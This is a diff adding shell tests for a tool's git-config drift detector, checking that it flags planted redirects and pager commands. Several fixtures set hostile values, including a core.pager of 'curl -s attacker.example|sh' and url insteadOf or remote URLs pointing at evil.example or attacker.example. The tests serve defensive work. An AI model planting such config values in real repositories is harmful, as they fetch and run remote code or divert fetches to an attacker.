@@ -3663,17 +3663,93 @@ crew_tty() {
   [ "$status" -eq 0 ]
 }
 
-@test "git-baseline --accept with no pairs writes an empty baseline (#585)" {
+@test "git-baseline --accept with no pairs writes a marker-only baseline (#585, #678)" {
   git commit -q --allow-empty -m init
   B="$TEST_REPO/.git/crew/git-config-baseline"
   rm "$B"
   crew_tty yes git-baseline --accept
   [ "$status" -eq 0 ]
-  [ -f "$B" ]
-  [ ! -s "$B" ]
+  mapfile -d '' recs <"$B"
+  [ "${#recs[@]}" -eq 1 ]
+  [ "${recs[0]}" = $'#covers\nredirect' ]
   run run_crew git-baseline
   [ "$status" -eq 0 ]
   [[ "$output" == *"no drift"* ]]
+}
+
+@test "git-baseline lists a planted url insteadOf redirect (#678)" {
+  git commit -q --allow-empty -m init
+  seed_git_baseline
+  git config "url.https://evil.example/.insteadOf" "https://github.com/"
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"url.https://evil.example/.insteadof=https://github.com/ (main checkout, "* ]]
+}
+
+@test "git-baseline shows an exec value verbatim: the payload before an @ stays visible (#678)" {
+  git commit -q --allow-empty -m init
+  seed_git_baseline
+  git config core.pager 'curl -s attacker.example|sh;: a@less'
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *attacker.example* ]]
+}
+
+@test "git-baseline shows an exec value verbatim that looks like a URL (#678)" {
+  git commit -q --allow-empty -m init
+  seed_git_baseline
+  git config core.pager 'x://curl attacker.example|sh;:@less'
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *attacker.example* ]]
+}
+
+@test "git-baseline shows a bracketed ssh userinfo host verbatim (#678)" {
+  git commit -q --allow-empty -m init
+  git config remote.origin.url https://github.com/o/r.git
+  seed_git_baseline
+  git config remote.origin.url 'ssh://[evil.example]:22@github.com/o/r.git'
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *evil.example* ]]
+}
+
+@test "git-baseline shows an scp-style remote url raw, so its host stays visible (#678)" {
+  git commit -q --allow-empty -m init
+  git config remote.origin.url https://github.com/o/r.git
+  seed_git_baseline
+  git config remote.origin.url 'attacker.example:x@github.com:o/r.git'
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *remote.origin.url=attacker.example:x@github.com:o/r.git* ]]
+}
+
+@test "git-baseline notes a baseline that predates redirect-key coverage (#678)" {
+  git commit -q --allow-empty -m init
+  : >"$TEST_REPO/.git/crew/git-config-baseline"
+  git config remote.origin.url https://x.example/r.git
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"predates redirect-key coverage"* ]]
+  [[ "$output" == *"next dispatch"* ]]
+  [[ "$output" == *"--accept"* ]]
+  [[ "${output%%remote.origin.url=*}" == *"predates redirect-key coverage"* ]]
+  [[ "$output" == *"remote.origin.url=https://x.example/r.git"* ]]
+}
+
+@test "git-baseline --accept records the redirect marker (#678)" {
+  git commit -q --allow-empty -m init
+  B="$TEST_REPO/.git/crew/git-config-baseline"
+  : >"$B"
+  git config remote.origin.url https://x.example/r.git
+  crew_tty yes git-baseline --accept
+  [ "$status" -eq 0 ]
+  mapfile -d '' recs <"$B"
+  [[ " ${recs[*]} " == *$'#covers\nredirect'* ]]
+  run run_crew git-baseline
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"no drift"* ]]
+  [[ "$output" != *"predates"* ]]
 }
 
 @test "git-baseline --accept repairs a lone-NUL baseline (#585)" {
